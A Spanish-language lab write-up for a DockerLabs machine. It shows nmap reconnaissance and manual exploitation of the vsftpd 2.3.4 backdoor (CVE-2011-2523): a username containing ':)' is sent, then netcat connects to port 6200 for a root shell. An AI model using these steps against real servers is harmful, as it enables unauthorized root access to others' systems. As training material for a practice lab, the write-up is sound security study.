# 🧪 Writeup – Explotación de vsftpd 2.3.4 (DockerLabs)

## 📌 Información general

* **Plataforma:** DockerLabs
* **Dificultad:** Muy fácil
* **Objetivo:** Obtener acceso remoto explotando un servicio vulnerable
* **Sistema objetivo:** Contenedor Linux

---

## 🔍 Reconocimiento

Antes de interactuar con la máquina, se realizó una comprobación básica de conectividad mediante `ping` para verificar que el host se encontraba activo.

Posteriormente, se procedió al escaneo de puertos y servicios utilizando **nmap**, con el fin de identificar servicios expuestos y posibles vectores de ataque.

### 📡 Escaneo de puertos

```bash
sudo nmap -sS -sV -O -v <IP_OBJETIVO>
```

### 📄 Resultado relevante

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

Del escaneo se detectó el puerto **21/tcp** abierto, corriendo el servicio **FTP** con la versión **vsftpd 2.3.4**, una versión conocida por contener una backdoor.
El puerto 80 solo tenia el index de apache

---

## 🚨 Identificación de la vulnerabilidad

Investigando la versión detectada, se encontró que **vsftpd 2.3.4** es vulnerable a una backdoor documentada como **CVE-2011-2523**.

### 🧠 Descripción de la vulnerabilidad

* La versión 2.3.4 de vsftpd fue distribuida con código malicioso.
* Si se intenta autenticar con un nombre de usuario que contenga la cadena `:)`, el servicio habilita una shell remota.
* Dicha shell queda escuchando en el puerto **6200**.
* No se requieren credenciales válidas.
* La shell se ejecuta con privilegios **root**.

---

## 💥 Explotación manual del backdoor

La explotación se realizó **manualmente**, sin utilizar frameworks como Metasploit.

### 🔑 Conexión al servicio FTP

```bash
ftp <IP_OBJETIVO>
```

Cuando el servicio solicitó el usuario, se ingresó:

```text
test:)
```

La contraseña puede ser cualquiera:

```text
1234
```

Aunque el servidor devuelva un mensaje de *Login incorrect*, el backdoor ya queda activado.

---

### 🔓 Acceso a la shell backdoor

Una vez activado el backdoor, se realizó la conexión al puerto oculto **6200**:

```bash
nc <IP_OBJETIVO> 6200
```

### ✅ Verificación de acceso

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Esto confirma la obtención de una **shell como root** dentro del sistema objetivo.

---


## 🏁 Conclusión

La máquina fue comprometida exitosamente explotando una vulnerabilidad conocida en **vsftpd 2.3.4**. Mediante un reconocimiento básico y la identificación de una versión vulnerable, fue posible obtener acceso remoto como root utilizando una técnica manual simple.

Este laboratorio demuestra la importancia de:

* Mantener servicios actualizados
* No exponer versiones vulnerables
* Comprender el impacto real de vulnerabilidades conocidas

---

## 📚 Referencias

* CVE-2011-2523
* Documentación oficial de vsftpd
* DockerLabs

---
